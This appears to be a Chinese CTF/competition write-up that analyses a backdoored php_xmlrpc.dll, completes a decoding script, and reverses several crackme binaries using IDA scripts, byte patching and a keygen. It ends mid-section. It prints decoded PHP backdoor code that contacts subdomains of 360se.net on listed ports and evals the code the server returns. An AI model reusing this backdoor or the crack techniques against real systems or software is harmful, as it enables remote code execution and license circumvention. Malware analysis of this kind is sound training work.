4);\nv24 = *(_DWORD *)(v23 + 296);\n*(_DWORD *)(v23 + 296) = v31;\nv38 = v24;\nv25 = setjmp3(v31, 0);\nv26 = v38;\nif ( v25 )\n  *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v38;\nelse\n  zend_eval_string(v41, 0, &byte_10011B34, a3);\n*(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v26;\nif ( dword_1000C010 < 3600 )\n  dword_1000C010 += 3600;\nftime(&Tmb);\n```\n\n\n\n这里格式化字符串指向了 **gzuncompress** 组成了 **@eval(gzuncompress(v41))**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/7hmdBrSATiP6IyJF1710404947.png)\n\n这里对v10 v11和v41进行处理，起始地址为 **asc_1000C028** 到 **unk_1000C66C** 所以v41的内容就是这个范围内的所有字节。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/8Q6RQb3ijaahjOnP1710404947.png)\n\n\n\n所以这里v41就是 0x1000C028 - 0x1000C66C 范围内所有的字节通过 **gzcompress** 压缩后的内容，因此如果我们要溯源得到源代码就需要利用到 **zlib.uncompress** 来还原。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/LA8xAt2l3hxdHI911710404947.png)\n\n所以第一题的偏移范围就是这两个地址。\n\n##### FLAG1: 1000C028-1000C66C\n\n#### 2.  继续分析反汇编后代码，找出在恶意代码中的关键函数，将用于字符串拼接的函数名称作为Flag值提交；（提交形式：echo()）\n\n这里是利用 **ssprintf** 来拼接，按照格式来交。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/zUtPPAU5hbRjI38j1710404947.png)\n\n##### FLAG2: ssprintf()\n\n#### 3.  继续分析反汇编后代码，找出在恶意代码中的关键函数，将用于格式化字符串的参数名称作为Flag值提交；（提交形式：%*）\n\n格式化字符串 %s 就是将指向的字符串引导至对应的位置。\n\npython也有 %s 这种用法：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/5r91cgoRY7tBGk9t1710404947.png)\n\n##### FLAG3: %s\n\n#### 4.  继续分析反汇编后代码，找出在恶意代码中的关键函数，将用于字符串传参的参数名称作为Flag值提交；（提交形式：%*）\n\n和上题一样 也是%s，换了个意思。\n\n##### FLAG4: %s\n\n#### 5.  找出靶机Windows7桌面上文件夹1中的decode.py文件并完善此文件，填写该文件当中空缺的F1、F2、F3、F4四个字符串，将四个字符串拼接后的内容作为Flag值提交；\n\ndecode.py:\n\n```python\n# -*- coding:utf-8 -*-\n#!/usr/bin/env python\nimport os,sys,string,shutil,re\nimport base64\nimport struct\nimport ctypes\nimport zlib\nimport pefile\n\ndef hexdump(src,length=16):\n\tFILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])\n\tlines = []\n\tfor c in range(0,len(src),length):\n\t\tchars = src[c:c + length]\n\t\thex = ''.join([\"%02x\" % x for x in chars])\n\t\tprintable = ''.join([\"%s\" % ((x <= 127 and FILTER[x]) or '.') for x in chars])\n\t\tlines.append(\"%04x %-*s %s\\n\" %(c,length * 3,hex,printable))\n\treturn ''.join(lines)\n\ndef descrypt(data):\n\ttry:\n\t\tnum = 0\n\t\tdata = zlib.F1(data)\n\t\treturn (True,result)\n\texcept Exception as e:\n\t\tprint(e)\n\t\treturn (False,\"\")\n\ndef GetSectionData(pe,Section):\n\ttry:\n\t\tep =Section.VirtualAddress\n\t\tep_ava = Section.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase\n\t\tdata = pe.get_memory_mapped_image()[ep:ep + Section.Misc_VirtualSize]\n\t\tprint(\": \" + hexdump(data))\n\t\treturn data\n\texcept Exception as e:\n\t\treturn None\n\ndef GetSecsions(PE):\n\ttry:\n\t\tfor section in PE.sections:\n\t\t\tif(section.Name.replace(b'\\x00',b'') == b'.data'):\n\t\t\t\tdata = GetSectionData(PE,section)\n\n\t\t\t\treturn (True,data)\n\t\treturn (False,\"\")\n\texcept Exception as e:\n\t\treturn (False,\"\")\n\ndef get_encodedata(filename): \n\tpe = pefile.PE(filename)\n\t(ret,data) = GetSecsions(pe)\n\tif ret:\n\t\tflag = b'F2'\n\t\toffset = data.find(flag)\n\t\tdata = data[offset + 0x10:offset + 0x10 + 0x567*4].replace(b\"\\x00\\x00\\x00\",b\"\")\n\t\tdecodedata_1 = zlib.F1(data[:0x191])\n\t\tdecodedata_2 = zlib.F1(data[0x191:])\n\t\twith open(\"compres_data1.txt\",\"w\") as hwrite:\n\t\t\thwrite.write(F3)\n\t\t\thwrite.close\n\t\twith open(\"compres_data2.txt\",\"w\") as hwrite:\n\t\t\thwrite.write(F4)\n\t\t\thwrite.close\n#Flag=F1.F2.F3.F4\n\ndef main(path):\n\tc2s = []\n\tdomains = []\n\tfile_list = os.listdir(path)\n\tfor f in file_list:\n\t\tprint (f)\n\t\tfile_path = os.path.join(path, f)\n\t\tget_encodedata(file_path)\n\nif __name__ == \"__main__\":\n\tget_encodedata(sys.argv[1])\n\n```\n\n\n\n##### 脚本分析\n\n这个脚本先是接受了一个文件路径，然后传入 **get_encodedata(file_path)**\n\n**get_encodedata()** 函数读取传入的文件，然后尝试使用 **pefile.PE** 这个模块打开文件，利用 **GetSecsions()** 获取ret和data\n\n几个函数的功能：\n\n- GetSecsions(PE) 通过传入的 PE 利用PE.sections 获取该文件的各段地址，遍历+判断如果为data段则使用 **GetSectionData(PE,section)** 获取data段的内容\n- GetSectionData(pe,Section) 获取data段的字节内容。利用函数获取data段的起始地址和结束地址 ，使用 **pe.get_memory_mapped_image()** 函数获取文件的所有字节内容，再将起始地址和结束地址作为区间，**截取data段的数据**。最后再使用 **hexdump(data)** 展示字节内容\n- hexdump(src,length=16) 类似于linux的 **xxd** 或者 **winhex** 的16进制字节展示。\n\n简单来说前面几步就是在获取 data段 的内容字节。\n\n当获取成功时，执行以下部分\n\n```python\nif ret:\n\t\tflag = b'F2'\n\t\toffset = data.find(flag)\n\t\tdata = data[offset + 0x10:offset + 0x10 + 0x567*4].replace(b\"\\x00\\x00\\x00\",b\"\")\n\t\tdecodedata_1 = zlib.F1(data[:0x191])\n\t\tdecodedata_2 = zlib.F1(data[0x191:])\n\t\twith open(\"compres_data1.txt\",\"w\") as hwrite:\n\t\t\thwrite.write(F3)\n\t\t\thwrite.close\n\t\twith open(\"compres_data2.txt\",\"w\") as hwrite:\n\t\t\thwrite.write(F4)\n\t\t\thwrite.close\n```\n\n找到关键词F2在data段的偏移，然后通过偏移计算获取一个区间的所有内容。这里根据逻辑其实能明白就是 **获取上面分析的恶意代码0x1000C028-0x1000C66C之间的内容**\n\n然后又用了 **zlib.F1** 的某个函数对data以0x191(401)前后截取的内容，由于恶意代码中使用 **gzuncompress **进行解压，所以这里用的是zlib库的 **decompress** 解压。\n\n**decodedata_1** 就是 data[:0x191] 的内容，其实就是**0x1000C028-0x1000C66C**的部分，也就是第一部分。\n\n为什么是0x191呢？0x1000C028-0x1000C66C之间长为 **1604** 每一个字符由4个字节组成：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/1l1InwHwF7Cptv201710404948.png)\n\ndata先前替换了\\x00了，所以去除\\x00的部分就是 **1604 // 4 = 401**\n\n**decodedata_2** 是data[0x191:]到结尾的内容，就是 **0x1000C66C-0x1000D5C4**，也就是第二部分代码。\n\n最后分别打开了两个文本，将两个数据写入。\n\n\n\n##### F1-F4\n\nF1: decompress 上面分析过了就是对得到的内容解码，用zlib库的decompress函数。\n\nF2: gzuncompress 这里要根据下面的区间起始地址来逆推：\n\n```python\ndata = data[offset + 0x10:offset + 0x10 + 0x567*4].replace(b\"\\x00\\x00\\x00\",b\"\")\n```\n\n因为这里列表的开始下标是offset + 0x10，指向的是恶意代码的起始地址，而我们已知这部分地址是**0x1000C028**，所以这里的offset就是 **0x1000C028 - 0x10 = 0x1000C018**。\n\nIDA中对应找到的就是 **gzuncompress**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/vwo8VGtZFg6nJ0JV1710404948.png)\n\nF3: str(decodedata_1) 解码出来的结果是byte类型，且由于打开文本的模式为 **w**，所以要转换成str类型才能写入文本，这里个人感觉 **decodedata_1.decode()**更合理。\n\nF4: str(decodedata_2)\n\n##### FLAG5: decompress.gzuncompress.str(decodedata_1).str(decodedata_2)\n\n#### 6.  执行decode.py后将生产两个文件，对第二个文件中内容进行分析并解码，将其中出现的端口列表中的所有端口号一招从小到大的顺序依次排列作为Flag值（如：21,22,23,80）提交；\n\n完善脚本后，切换到**php-5.2.17/ext**文件夹，命令行输入 ```python decode.py php_xmlrpc.dll``\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/xIhcIRtxyfj2t8aa1710404948.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/DFgs3N7qM3zFQ7Ek1710404948.png)\n\n##### 第一部分分析\n\n打开**compress_data1.txt**\n\n```php\nb\" @eval( base64_decode('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpOwplcnJvcl9yZXBvcnRpbmcoMCk7CiRoID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOwokcCA9ICRfU0VSVkVSWydTRVJWRVJfUE9SVCddOwokZnAgPSBmc29ja29wZW4oJGgsICRwLCAkZXJybm8sICRlcnJzdHIsIDUpOwppZiAoISRmcCkgewp9IGVsc2UgewoJJG91dCA9ICJHRVQgeyRfU0VSVkVSWydTQ1JJUFRfTkFNRSddfSBIVFRQLzEuMVxyXG4iOwoJJG91dCAuPSAiSG9zdDogeyRofVxyXG4iOwoJJG91dCAuPSAiQWNjZXB0LUVuY29kaW5nOiBjb21wcmVzcyxnemlwXHJcbiI7Cgkkb3V0IC49ICJDb25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIjsKIAoJZndyaXRlKCRmcCwgJG91dCk7CglmY2xvc2UoJGZwKTsKfQ=='));\"\n```\n\nbase64解密得到：\n\n```php\n@ini_set(\"display_errors\",\"0\");\nerror_reporting(0);\n$h = $_SERVER['HTTP_HOST'];\n$p = $_SERVER['SERVER_PORT'];\n$fp = fsockopen($h, $p, $errno, $errstr, 5);\nif (!$fp) {\n} else {\n\t$out = \"GET {$_SERVER['SCRIPT_NAME']} HTTP/1.1\\r\\n\";\n\t$out .= \"Host: {$h}\\r\\n\";\n\t$out .= \"Accept-Encoding: compress,gzip\\r\\n\";\n\t$out .= \"Connection: Close\\r\\n\\r\\n\";\n \n\tfwrite($fp, $out);\n\tfclose($fp);\n}\n```\n\n使用fsockopen模拟GET发包\n\n\n\n##### 第二部分分析\n\n打开**compress_data2.txt**\n\n```php\nb\"$i='info^_^'.base64_encode($V.'<|>'.$M.'<|>').'==END==';$zzz='-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------';@eval(base64_decode('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpOwplcnJvcl9yZXBvcnRpbmcoMCk7CmZ1bmN0aW9uIHRjcEdldCgkc2VuZE1zZyA9ICcnLCAkaXAgPSAnMzYwc2UubmV0JywgJHBvcnQgPSAnMjAxMjMnKXsKCSRyZXN1bHQgPSAiIjsKICAkaGFuZGxlID0gc3RyZWFtX3NvY2tldF9jbGllbnQoInRjcDovL3skaXB9OnskcG9ydH0iLCAkZXJybm8sICRlcnJzdHIsMTApOyAKICBpZiggISRoYW5kbGUgKXsKICAgICRoYW5kbGUgPSBmc29ja29wZW4oJGlwLCBpbnR2YWwoJHBvcnQpLCAkZXJybm8sICRlcnJzdHIsIDUpOwoJaWYoICEkaGFuZGxlICl7CgkJcmV0dXJuICJlcnIiOwoJfQogIH0KICBmd3JpdGUoJGhhbmRsZSwgJHNlbmRNc2cuIlxuIik7Cgl3aGlsZSghZmVvZigkaGFuZGxlKSl7CgkJc3RyZWFtX3NldF90aW1lb3V0KCRoYW5kbGUsIDIpOwoJCSRyZXN1bHQgLj0gZnJlYWQoJGhhbmRsZSwgMTAyNCk7CgkJJGluZm8gPSBzdHJlYW1fZ2V0X21ldGFfZGF0YSgkaGFuZGxlKTsKCQlpZiAoJGluZm9bJ3RpbWVkX291dCddKSB7CgkJICBicmVhazsKCQl9CgkgfQogIGZjbG9zZSgkaGFuZGxlKTsgCiAgcmV0dXJuICRyZXN1bHQ7IAp9CgokZHMgPSBhcnJheSgid3d3IiwiYmJzIiwiY21zIiwiZG93biIsInVwIiwiZmlsZSIsImZ0cCIpOwokcHMgPSBhcnJheSgiMjAxMjMiLCI0MDEyNSIsIjgwODAiLCI4MCIsIjUzIik7CiRuID0gZmFsc2U7CmRvIHsKCSRuID0gZmFsc2U7Cglmb3JlYWNoICgkZHMgYXMgJGQpewoJCSRiID0gZmFsc2U7CgkJZm9yZWFjaCAoJHBzIGFzICRwKXsKCQkJJHJlc3VsdCA9IHRjcEdldCgkaSwkZC4iLjM2MHNlLm5ldCIsJHApOyAKCQkJaWYgKCRyZXN1bHQgIT0gImVyciIpewoJCQkJJGIgPXRydWU7CgkJCQlicmVhazsKCQkJfQoJCX0KCQlpZiAoJGIpYnJlYWs7Cgl9CgkkaW5mbyA9IGV4cGxvZGUoIjxePiIsJHJlc3VsdCk7CglpZiAoY291bnQoJGluZm8pPT00KXsKCQlpZiAoc3RycG9zKCRpbmZvWzNdLCIvKk9uZW1vcmUqLyIpICE9PSBmYWxzZSl7CgkJCSRpbmZvWzNdID0gc3RyX3JlcGxhY2UoIi8qT25lbW9yZSovIiwiIiwkaW5mb1szXSk7CgkJCSRuPXRydWU7CgkJfQoJCUBldmFsKGJhc2U2NF9kZWNvZGUoJGluZm9bM10pKTsKCX0KfXdoaWxlKCRuKTs='));\"\n```\n\n一个@eval(base64_decode(payload))的木马，将内容base64解密得到：\n\n```php\n@ini_set(\"display_errors\",\"0\");\nerror_reporting(0);\nfunction tcpGet($sendMsg = '', $ip = '360se.net', $port = '20123'){\n\t$result = \"\";\n  $handle = stream_socket_client(\"tcp://{$ip}:{$port}\", $errno, $errstr,10); \n  if( !$handle ){\n    $handle = fsockopen($ip, intval($port), $errno, $errstr, 5);\n\tif( !$handle ){\n\t\treturn \"err\";\n\t}\n  }\n  fwrite($handle, $sendMsg.\"\\n\");\n\twhile(!feof($handle)){\n\t\tstream_set_timeout($handle, 2);\n\t\t$result .= fread($handle, 1024);\n\t\t$info = stream_get_meta_data($handle);\n\t\tif ($info['timed_out']) {\n\t\t  break;\n\t\t}\n\t }\n  fclose($handle); \n  return $result; \n}\n\n$ds = array(\"www\",\"bbs\",\"cms\",\"down\",\"up\",\"file\",\"ftp\");\n$ps = array(\"20123\",\"40125\",\"8080\",\"80\",\"53\");\n$n = false;\ndo {\n\t$n = false;\n\tforeach ($ds as $d){\n\t\t$b = false;\n\t\tforeach ($ps as $p){\n\t\t\t$result = tcpGet($i,$d.\".360se.net\",$p); \n\t\t\tif ($result != \"err\"){\n\t\t\t\t$b =true;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif ($b)break;\n\t}\n\t$info = explode(\"<^>\",$result);\n\tif (count($info)==4){\n\t\tif (strpos($info[3],\"/*Onemore*/\") !== false){\n\t\t\t$info[3] = str_replace(\"/*Onemore*/\",\"\",$info[3]);\n\t\t\t$n=true;\n\t\t}\n\t\t@eval(base64_decode($info[3]));\n\t}\n}while($n);\n```\n\n遍历指定端口列表 **$ps** 和 域名列表 **$ds**。建立fsockopen通信，多次反弹后门到服务器360se.net。\n\n这里端口列表就是 ```$ps = array(\"20123\",\"40125\",\"8080\",\"80\",\"53\");```\n\n##### FLAG6: 53,80,8080,20123,40125\n\n\n\n### *代码渗透测试（2022广东 SMC保护逆向）\n\n#### 1.从靶机服务器的FTP上下载flag0072，分析该文件，请提交代码保护技术的类型。提交格式：XXXX。\n\n32位exe程序，用IDA分析。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/5hHbnTM6jtYgNIEj1710404948.png)\n\n在 **Main** 函数中发现了先是接收传入的参数，然后对 **check** 进行了一个解密操作。\n\n跟进 **decrypt**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/fJxfeUOEi7rUaUEL1710404948.png)\n\n是一个逐位异或，异或后的结果却没有和什么字符串进行比较，这样我们是做不出来的。\n\nShift+f12打开字符串，发现了wrong和right的字符串\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/JGKLgx6j7iYu2vwQ1710404949.png)\n\n点击Wrong，Ctrl + X 查找引用的地方\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ME9Ityaftkjv6vcT1710404949.png)\n\n此时会报错，提示我们没有关于wrong的引用。\n\n这就说明了核心代码被加密了，导致了我们看不了这些字符串的引用。加上前面的异或操作，根据经验就能分析出是 **SMC** 加密。\n\n```\nSMC（Software-Based Memory Encryption）是一种局部代码加密技术，它可以将一个可执行文件的指定区段进行加密，使得黑客无法直接分析区段内的代码，从而增加恶意代码分析难度和降低恶意攻击成功的可能性。\n```\n\nSMC加密主要是为了防止IDA这类工具的反编译，以防核心代码被破解。\n\n其经典的特征就是核心代码前会进行一个异或加密。\n\n我们跟进check参数：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/7NqnlJdN1As6nt9j1710404949.png)\n\n打开其地址的详情就能发现check有一部分代码没有被IDA识别，那么这一段代码进行一个异或decrypt解密就是源代码了\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/jtnpdx9ZAxPG5VSu1710404949.png)\n\n##### FLAG1: SMC\n\n#### 2.提交被保护的代码所在地址。提交格式： 0xXXXX。\n\n上面分析到decrypt是解密 **check** 的代码，所以地址就是check的地址。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/OA2VtP12gPkTt4gC1710404949.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/4j44pfGl8QHmOjzR1710404950.png)\n\n##### FLAG2: 0x00401500\n\n#### 3.提交代码解密的密钥。提交格式： 0xXX。\n\n解密的密钥就是decrypt函数中异或的值\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/csNbzRtgx7gPITNN1710404950.png)\n\n这里 u 代表着无符号，去掉即可。\n\n##### FLAG3: 0xAA\n\n#### 4.请提交输入正确flag时的输出。提交格式： XXXX。\n\nShift+F12能看到有一个right，很明显就是正确flag的输出。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/t9Md06HKfm6Y7Iv91710404950.png)\n\n##### FLAG4: You are Right!\n\n#### 5.提交flag的值。提交格式：XXXX。\n\n我们要找到flag的值就需要解密上面那段SMC加密。\n\n解密SMC加密的手段通常是 **编写一个idc或py脚本：指定一个地址进行异或，然后使用IDA的导入脚本，即可还原。**\n\n 这里两种脚本都讲一下。\n\n##### Python\n\n```python\naddr = 0x401500\nfor i in range(248):\n    patch_byte(addr+i,get_wide_byte(addr+i)^0xAA)\n```\n\nIDAPython中有函数 **Patch_byte** 来修改字节和 **get_wide_byte **获取字节。这里addr设置为0x401500，用for循环遍历addr再逐位异或替换即可。\n\n##### Idc\n\n```c++\n#include <idc.idc>\n\nstatic main()\n{\n    auto addr = 0x401500;\n    auto i;\n    for(i = 0; i <= 248; ++i){\n        PatchByte(addr+i,Byte(addr+i)^0xAA);\n    }\n}\n```\n\nidc脚本有些类似C，但还是有差别 所以要写的话比较麻烦。\n\n**static** 用于定义函数， **auto** 用于定义变量，然后同样用 **PatchByte** 来修改字节。\n\n###### 解密SMC\n\n两种脚本选择其一，然后打开IDA导入脚本：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/EqB06sndH4tlsazt1710404950.png)\n\n导入后原来未定义的代码就变成了这样：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/t5qS8QF7nZ90PRT41710404950.png)\n\n变成汇编了，此时我们选中红色的部分 按P 即可识别这部分代码。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/KOeMWO3wdUta2FB31710404951.png)\n\n此时F5反汇编，就能看见代码了。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/otETTmZcJjqBoIrt1710404951.png)\n\n可以看到wrong和right字符串，但代码部分没有解析完全。这是由于check函数本身还有一部分代码，我们对着转换后的代码识别就创建了另一个函数sub_401503，导致寄存器之间传参缺少部分 代码识别不完全。\n\n所以要还原，我们需要将check的那部分代码与转换的代码拼接在一起。\n\n撤回反编译的操作。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/7ot0zSMtUYaIOacq1710404951.png)\n\n然后将红色的check部分以上**按d转换成代码**，确定后就能发现代码往下移了\n\n、![](http://cdn.anyiblog.top/WriteUp/20240314/i06hoKVCcaEE76UT1710404951.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/L4rd2f6EjVAbjNRH1710404952.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/LaZA6HhyXXa73dnq1710404952.png)\n\n此时再对着红色部分按p识别，再按F5反编译，就能发现代码恢复成功。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/JYffJLZ1W6o5h8Z81710404952.png)\n\n###### 解密代码\n\n```c++\nint __cdecl sub_401501(int a1, char *Str)\n{\n  size_t v2; // ebx\n  size_t v3; // ebx\n  char v5[100]; // [esp+18h] [ebp-70h] BYREF\n  size_t i; // [esp+7Ch] [ebp-Ch]\n\n  memset(v5, 0, sizeof(v5));\n  qmemcpy(v5, \"gm`fzpRghvp71iB97DHRW|\", 22);\n  v2 = strlen(Str);\n  if ( v2 != strlen(v5) )\n  {\nLABEL_4:\n    puts(\"Wrong!\");\n    exit(-1);\n  }\n  for ( i = 0; ; ++i )\n  {\n    v3 = i;\n    if ( v3 >= strlen(v5) )\n      break;\n    if ( ((unsigned __int8)v5[i] ^ 1) != Str[i] )\n      goto LABEL_4;\n  }\n  return printf(\"You are Right!\");\n}\n```\n\n赋值给v5字符串 ```gm`fzpRghvp71iB97DHRW|```\n\n然后进行了一个循环，对v5逐位异或1，与输入的值比较。\n\n所以我们将这个字符串逐位异或1就能得到我们输入的值，也就是flag。\n\n写一个Python解密下。\n\n```python\nstrings = b\"gm`fzpRghvp71iB97DHRW|\"\nfor i in strings:\n    print(chr(i^1),end='')\n```\n\n运行后得到FLAG。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/RLJwSu94KqWVnzbi1710404952.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ymHZpi6cqO7yZvim1710404952.png)\n\n##### FLAG5: flag{qSfiwq60hC86EISV}\n\n\n\n### *逆向分析及隐写（2022广东&浙江原题）\n\n#### 1.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将main函数的入口地址作为Flag值提交；\n\nIDA64位打开exe进行分析![](http://cdn.anyiblog.top/WriteUp/20240314/ND0LDGraGL7CWJo21710404952.png)因为是windows程序，所以这里main函数会显示为winmain，找其地址作为flag即可\n\n##### FLAG1: 0x0000000140001000\n\n#### 2.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将该二进制文件中检查许可证的关键函数作为Flag值提交；\n\n程序主运行的函数是sub_140001250\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/lQkU1z7UkgYpxSS51710404953.png)\n\n主程序中最后部分，将参数带入函数根据返回值判断，会导致程序回显的消息不同\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/UTtRfL5f0FjuPiZ31710404953.png)\n\n最终flag是检测函数的地址，即sub_1400016A0的地址：0x00000001400016A0\n\n##### FLAG2: 0x00000001400016A0\n\n#### 3.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，找到Flag值并提交；\n\nmain函数中有一个函数 **sub_140001920** 给了我们提示\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/iYDlhIVMsx7y7ArO1710404953.png)\n\n告诉我们要分析程序的背景图片，可能藏有flag。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ihhO3JCThkQrVcWh1710404953.png)\n\n这边exe可以用7z提取\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/E3Hs5y8pnXIymRzS1710404954.png)\n在\\.rsrc\\2052\\BITMAP路径下发现背景图片\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/K9wnHGScQfdsfhJc1710404954.png)\n\n用winhex分析，在图片尾部有一段数据很可疑。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/NrE8tEePJa1mU2bb1710404954.png)\n\n这是一段完整的hex，被分到了每一字节。所以这里提取hex值尝试转文字\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Vkya3xnMUKhcoe0l1710404954.png)\n\n##### FLAG3: Flag1{c@Nt_5e_mE}\n\n#### 4.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，尝试破解该二进制文件，将注册成功后的回显信息作为Flag值提交；\n\n关键函数这里，满足条件时（即密码正确）会显示变量lpText的内容\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/KI8Fdtgq5NsrHErb1710404954.png)\n\n我们观察这个变量，实际上就是经过sub_1400017D0的byte_140005048变量内容\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/pVnOa4iYElLGupSt1710404954.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/2mxWCYJiAXpKQsVN1710404955.png)\n\n但由于函数比较复杂，解密起来有难度。所以这里可以直接将判断中的值修改，原本是1，将其改成0即可满足条件\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/hkZIm51KG0qOPhhg1710404955.png)\n\n用IDA插件自带功能的Edit-Patch program-Change byte功能，将hex数据中01修改为0\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/5S1GV9L5fRnLEWaw1710404955.png)\n\n确认后程序已经修改成功，同样用自带功能的Apply patches to input file将文件导出\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/v9g0qqt4BmzmsEtz1710404955.png)\n\n一切修改完毕后，再次打开exe程序随意输入东西回车得到flag\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/JcJ9vy93dvbEZDmr1710404955.png)\n\n（正常得到许可证后输入得到的也是flag ）\n\n或者这里用windbg调试，断点return result处：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/0NNTzvebGcQ6Hrgm1710404956.png)\n\n运行到此处时，查看变量内容\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/CD9ER0DwuqzMKJhB1710404956.png)\n\n\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/KixvUpLcA7WO4L241710404956.png)\n\n点击byte数组变量，查看得到FLAG\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/dAXNX4F3DSeQ662H1710404956.png)\n\n##### FLAG:Flag{yes_u_w0n!}\n\n#### 5.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将该激活所需的许可证码作为Flag值提交；\n\n##### 分析\n\n跟进检测函数尝试逆向获取许可证\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/oa88adC39xoMXooD1710404956.png)\n\n一个简单的异或加密，将输入的东西a1经过sub_1400017B00加密，再取其负值，最后与dword_140005044+i的数字进行异或。\n\n要求我们得到的东西要和dword_140005000一样。sub_1400017B0加密函数:\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/3cwjqaGykuyCgLAS1710404957.png)\n\ndword_140005044：0x41\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/hZmcKqaNSGFiLmwB1710404957.png)\n\ndword_140005000密文（由于是unsigned int类型，所以要来回转换下取其内容）：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ATAmAw03797hQ5fB1710404957.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/WmffiB3MyrOZXQpM1710404957.png)\n\n\n\n有了数据就可以搓脚本逆向解密了。\n\n##### 脚本\n\n这里有两种解法：\n\n1. 还原encode加密程序，然后利用encode爆破ascii码，将符合条件的ascii码筛选出来\n2. 按照加密的过程一步步逆序解密\n\n```python\ndword = [-100,72,-98,-103,78,-118,61,-91,83,-74,-128,6,39,-93,117,-103,-65]\nres = [0]*17\n\ndef encode(ascii,i):\n    char = lambda x:-(256-x) if x>=128 else x\n    temp = (16 * (ascii & 0xF)) | (ascii >> 4) & 0xF\n    temp = -char(temp)\n    temp ^= i + 65\n    return temp\n\ndef decode2():\n    for i in range(17):\n        for a in range(32，127):\n            res = encode(a,i)\n            if res == dword[i]:\n                print(chr(a),end='')\n\ndef decode():\n    for i in range(17):\n        dword[i] ^= 65 + i\n        dword[i] = -dword[i]\n        dword[i] = chr((16 * (dword[i] & 0xF)) | (dword[i] >> 4) & 0xF)\n    print(''.join(dword ))\n    \ndecode2()\ndecode()\n```\n\n\n\n这里要注意的就是爆破encode函数这一个解法中，由于C中的char类型大于127的ascii码就会负数补码，所以这里python也要这样处理。否则列表dword中正数的部分不会被爆破出来。\n\n这里我是用 **lambda表达式**  来处理负数补码，再调用一下即可。\n\n运行得到许可证：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/IXBaYg33kqVHyqDh1710404957.png)\n\n\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/F7kkUBLUNkIN9SBr1710404958.png)\n\n\n\n##### FLAG5: 2o22_Ch1n@Ski1ls!\n\n\n\n### *江苏re1-pythonasm.exe （Python字节码）\n\n#### Python字节码分析\n\n打开pythonasm文件\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/UpbtStCsozNT3ddG1710404958.png)\n\n```python\nDisassembly of encode:\n  0 LOAD_CONST               1 ('')\n  2 STORE_FAST               1 (result)\n\n  4 LOAD_GLOBAL              0 (enumerate)\n  6 LOAD_FAST                0 (string)\n  8 CALL_FUNCTION            1\n 10 GET_ITER\n 12 FOR_ITER                56 (to 70)\n 14 UNPACK_SEQUENCE          2\n 16 STORE_FAST               2 (p)\n 18 STORE_FAST               3 (i)\n\n 20 LOAD_GLOBAL              1 (ord)\n 22 LOAD_FAST                3 (i)\n 24 CALL_FUNCTION            1\n 26 LOAD_CONST               2 (168)\n 28 BINARY_XOR\n 30 LOAD_FAST                2 (p)\n 32 BINARY_XOR\n 34 